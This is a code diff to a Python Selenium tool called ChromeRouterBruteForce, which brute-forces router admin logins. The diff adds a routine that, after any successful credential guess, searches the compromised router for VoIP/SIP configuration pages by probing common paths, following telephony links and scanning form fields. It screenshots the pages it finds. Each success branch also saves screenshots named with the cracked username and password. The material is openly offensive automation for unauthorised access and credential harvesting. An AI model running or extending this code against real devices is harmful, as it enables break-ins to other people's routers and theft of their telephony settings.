@@ -600,6 +600,179 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
             return None
     
+    def find_voip_sip_pages(self, base_url):
+        """Find and navigate to VoIP/SIP configuration pages"""
+        try:
+            print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages...{Colors.END}")
+            
+            # Common VoIP/SIP page paths and keywords
+            voip_paths = [
+                "/voip", "/sip", "/voice", "/telephony", "/phone",
+                "/advanced/voip", "/advanced/sip", "/network/voip", "/network/sip",
+                "/admin/voip", "/admin/sip", "/config/voip", "/config/sip",
+                "/settings/voip", "/settings/sip", "/system/voip", "/system/sip",
+                "/voip.html", "/sip.html", "/voice.html", "/telephony.html",
+                "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html"
+            ]
+            
+            # VoIP/SIP related keywords to look for in links
+            voip_keywords = [
+                "voip", "sip", "voice", "telephony", "phone", "pbx", "trunk",
+                "call", "dial", "extension", "line", "gateway", "proxy"
+            ]
+            
+            screenshots_taken = []
+            
+            # Method 1: Try direct paths
+            for path in voip_paths:
+                try:
+                    voip_url = f"{base_url.rstrip('/')}{path}"
+                    print(f"{Colors.BLUE}[*] Trying VoIP path: {voip_url}{Colors.END}")
+                    
+                    self.driver.get(voip_url)
+                    time.sleep(3)
+                    
+                    # Check if page loaded successfully and contains VoIP/SIP content
+                    page_source = self.driver.page_source.lower()
+                    title = self.driver.title.lower()
+                    
+                    # Check for VoIP/SIP indicators
+                    voip_indicators = [
+                        'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
+                        'call', 'dial', 'extension', 'line', 'gateway', 'proxy',
+                        'sip server', 'voip server', 'phone system', 'call routing'
+                    ]
+                    
+                    voip_count = sum(1 for indicator in voip_indicators if indicator in page_source or indicator in title)
+                    
+                    if voip_count >= 2:  # At least 2 VoIP indicators
+                        print(f"{Colors.GREEN}[+] VoIP/SIP page found: {voip_url}{Colors.END}")
+                        print(f"{Colors.GREEN}[+] VoIP indicators: {voip_count}{Colors.END}")
+                        
+                        # Take screenshot
+                        screenshot_path = self.take_screenshot(f"voip_sip_config_{path.replace('/', '_')}", voip_url)
+                        if screenshot_path:
+                            screenshots_taken.append(screenshot_path)
+                        
+                        # Don't try more paths if we found a good one
+                        break
+                        
+                except Exception as e:
+                    continue
+            
+            # Method 2: Search for VoIP/SIP links on current page
+            try:
+                print(f"{Colors.BLUE}[*] Searching for VoIP/SIP links on current page...{Colors.END}")
+                
+                # Get all links on the page
+                links = self.driver.find_elements(By.TAG_NAME, "a")
+                
+                for link in links:
+                    try:
+                        link_text = link.text.lower()
+                        link_href = link.get_attribute("href")
+                        
+                        if link_href and any(keyword in link_text for keyword in voip_keywords):
+                            print(f"{Colors.BLUE}[*] Found VoIP link: {link_text} -> {link_href}{Colors.END}")
+                            
+                            # Click the link
+                            link.click()
+                            time.sleep(3)
+                            
+                            # Check if it's a VoIP/SIP page
+                            page_source = self.driver.page_source.lower()
+                            title = self.driver.title.lower()
+                            
+                            voip_indicators = [
+                                'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
+                                'call', 'dial', 'extension', 'line', 'gateway', 'proxy'
+                            ]
+                            
+                            voip_count = sum(1 for indicator in voip_indicators if indicator in page_source or indicator in title)
+                            
+                            if voip_count >= 2:
+                                print(f"{Colors.GREEN}[+] VoIP/SIP page found via link: {self.driver.current_url}{Colors.END}")
+                                
+                                # Take screenshot
+                                screenshot_path = self.take_screenshot("voip_sip_config_link", self.driver.current_url)
+                                if screenshot_path:
+                                    screenshots_taken.append(screenshot_path)
+                                
+                                # Go back to admin panel
+                                self.driver.back()
+                                time.sleep(2)
+                                
+                    except Exception as e:
+                        continue
+                        
+            except Exception as e:
+                print(f"{Colors.YELLOW}[!] Error searching for VoIP links: {e}{Colors.END}")
+            
+            # Method 3: Try common VoIP/SIP form elements
+            try:
+                print(f"{Colors.BLUE}[*] Searching for VoIP/SIP form elements...{Colors.END}")
+                
+                # Look for forms with VoIP/SIP related names/IDs
+                voip_form_selectors = [
+                    "form[name*='voip']", "form[name*='sip']", "form[name*='voice']",
+                    "form[id*='voip']", "form[id*='sip']", "form[id*='voice']",
+                    "input[name*='voip']", "input[name*='sip']", "input[name*='voice']",
+                    "select[name*='voip']", "select[name*='sip']", "select[name*='voice']"
+                ]
+                
+                for selector in voip_form_selectors:
+                    try:
+                        elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
+                        if elements:
+                            print(f"{Colors.GREEN}[+] Found VoIP/SIP form element: {selector}{Colors.END}")
+                            
+                            # Take screenshot of the form
+                            screenshot_path = self.take_screenshot("voip_sip_form", self.driver.current_url)
+                            if screenshot_path:
+                                screenshots_taken.append(screenshot_path)
+                            break
+                            
+                    except Exception as e:
+                        continue
+                        
+            except Exception as e:
+                print(f"{Colors.YELLOW}[!] Error searching for VoIP forms: {e}{Colors.END}")
+            
+            if screenshots_taken:
+                print(f"{Colors.GREEN}[+] VoIP/SIP screenshots taken: {len(screenshots_taken)}{Colors.END}")
+                return screenshots_taken
+            else:
+                print(f"{Colors.YELLOW}[!] No VoIP/SIP configuration pages found{Colors.END}")
+                return []
+                
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error finding VoIP/SIP pages: {e}{Colors.END}")
+            return []
+    
+    def search_voip_after_success(self, login_url, username, password):
+        """Search for VoIP/SIP pages after successful login"""
+        try:
+            print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages after successful login...{Colors.END}")
+            
+            # Extract base URL for VoIP search
+            from urllib.parse import urlparse
+            parsed_url = urlparse(login_url)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            
+            # Search for VoIP/SIP pages
+            voip_screenshots = self.find_voip_sip_pages(base_url)
+            
+            if voip_screenshots:
+                print(f"{Colors.GREEN}[+] Found {len(voip_screenshots)} VoIP/SIP configuration pages{Colors.END}")
+                return voip_screenshots
+            else:
+                print(f"{Colors.YELLOW}[!] No VoIP/SIP configuration pages found{Colors.END}")
+                return []
+                
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error searching for VoIP pages: {e}{Colors.END}")
+            return []
+    
     def quit(self):
         """Quit the browser driver"""
         if hasattr(self, 'driver') and self.driver:
@@ -874,6 +1047,10 @@ class ChromeRouterBruteForce:
                     # Wait a bit more for admin panel to fully load
                     time.sleep(3)
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                    
+                    # Search for VoIP/SIP pages after successful login
+                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    
                     return True, screenshot_path
                 else:
                     print(f"{Colors.YELLOW}[!] Basic Auth worked but not admin panel: {reason}{Colors.END}")
@@ -902,6 +1079,10 @@ class ChromeRouterBruteForce:
                 self.driver.get(login_url)
                 time.sleep(3)
                 screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                
+                # Search for VoIP/SIP pages after successful login
+                voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                
                 return True, screenshot_path
             else:
                 print(f"{Colors.YELLOW}[-] HTTP Digest Auth failed: Status {response.status_code}{Colors.END}")
@@ -975,6 +1156,10 @@ class ChromeRouterBruteForce:
                     if api_success:
                         print(f"{Colors.GREEN}[+] API-based Auth successful! {username}:{password}{Colors.END}")
                         screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                        
+                        # Search for VoIP/SIP pages after successful login
+                        voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                        
                         return True, screenshot_path
                         
                 except Exception as e:
@@ -1074,6 +1259,10 @@ class ChromeRouterBruteForce:
                 if success:
                     print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                    
+                    # Search for VoIP/SIP pages after successful login
+                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    
                     return True, screenshot_path
                 
                 # Check if URL changed (might indicate success)
@@ -1085,6 +1274,10 @@ class ChromeRouterBruteForce:
                     if success:
                         print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
                         screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                        
+                        # Search for VoIP/SIP pages after successful login
+                        voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                        
                         return True, screenshot_path
                 
             except Exception as e:
@@ -1141,6 +1334,10 @@ class ChromeRouterBruteForce:
             if success:
                 print(f"{Colors.GREEN}[+] Cookie-based Auth successful! {username}:{password}{Colors.END}")
                 screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                
+                # Search for VoIP/SIP pages after successful login
+                voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                
                 return True, screenshot_path
             
             return False, "Cookie-based Auth failed"
@@ -1194,6 +1391,10 @@ class ChromeRouterBruteForce:
                 if success:
                     print(f"{Colors.GREEN}[+] Redirect-based Auth successful! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                    
+                    # Search for VoIP/SIP pages after successful login
+                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    
                     return True, screenshot_path
             
             return False, "Redirect-based Auth failed"
@@ -1269,6 +1470,10 @@ class ChromeRouterBruteForce:
             if success:
                 print(f"{Colors.GREEN}[+] Form-based Auth successful! {username}:{password}{Colors.END}")
                 screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                
+                # Search for VoIP/SIP pages after successful login
+                voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                
                 return True, screenshot_path
             
             # If page title is empty, wait longer and try again
@@ -1281,6 +1486,10 @@ class ChromeRouterBruteForce:
                 if success:
                     print(f"{Colors.GREEN}[+] Form-based Auth successful after wait! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                    
+                    # Search for VoIP/SIP pages after successful login
+                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    
                     return True, screenshot_path
             
             # Additional check: if we have admin content but still on login page, it might be successful
@@ -1308,6 +1517,10 @@ class ChromeRouterBruteForce:
                 if admin_count >= 3 and login_count <= 2:
                     print(f"{Colors.GREEN}[+] Form-based Auth successful (admin content detected)! {username}:{password}{Colors.END}")
                     screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
+                    
+                    # Search for VoIP/SIP pages after successful login
+                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
+                    
                     return True, screenshot_path
             except:
                 pass
